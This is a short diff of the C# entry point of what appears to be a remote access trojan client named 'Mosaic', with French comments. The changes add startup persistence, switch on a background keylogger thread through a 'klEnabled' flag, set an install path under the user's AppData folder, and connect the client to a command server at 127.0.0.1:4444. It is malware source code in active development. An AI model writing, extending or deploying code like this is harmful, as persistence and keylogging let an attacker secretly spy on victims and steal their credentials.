@@ -10,10 +10,9 @@ namespace Client
 {
     static class Program
     {
-
         public static ClientMosaic client;
         public static Boot bootController;
-        private static ApplicationContext _msgLoop;
+        private static ApplicationContext _msgLoop; // keylogger
 
         /// <summary>
         /// Point d'entrée principal de l'application.
@@ -24,9 +23,12 @@ namespace Client
             bool result;
 
             bootController = new Boot();
-            StreamReader readerMutex = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);
-            MutexController.mutexKey = Boot.getMutexKey(readerMutex);;
-            result = MutexController.createMutex();
+
+            StreamReader readerMutex = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);// TODO virer
+            MutexController.mutexKey = Boot.getMutexKey(readerMutex);// TODO virer
+            result = MutexController.createMutex();// TODO virer
+
+            ClientData.installPath = Path.Combine(AuthenticationController.DIRECTORY, ((!string.IsNullOrEmpty(AuthenticationController.SUBDIRECTORY)) ? AuthenticationController.SUBDIRECTORY + @"\" : "") + AuthenticationController.INSTALLNAME); //  	Directory ~~== %USERPROFILE%\Application Data(\Roaming)
 
             if (!result)
             {
@@ -34,7 +36,13 @@ namespace Client
                 return;
             }
 
-            if (Settings.ENABLELOGGER)
+            if (bootController.autoStart)
+            {
+                if (!Boot.AddToStartup())
+                        ClientData.AddToStartupFailed = true;
+            }
+
+            if (bootController.klEnabled)
             {
                 new Thread(() =>
                 {
@@ -44,7 +52,6 @@ namespace Client
                 }){ IsBackground = true }.Start();
             }
 
-            ClientData.installPath = Path.Combine(AuthenticationController.DIRECTORY, ((!string.IsNullOrEmpty(AuthenticationController.SUBDIRECTORY)) ? AuthenticationController.SUBDIRECTORY + @"\" : "") + AuthenticationController.INSTALLNAME);
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             client = new ClientMosaic("127.0.0.1", 4444);
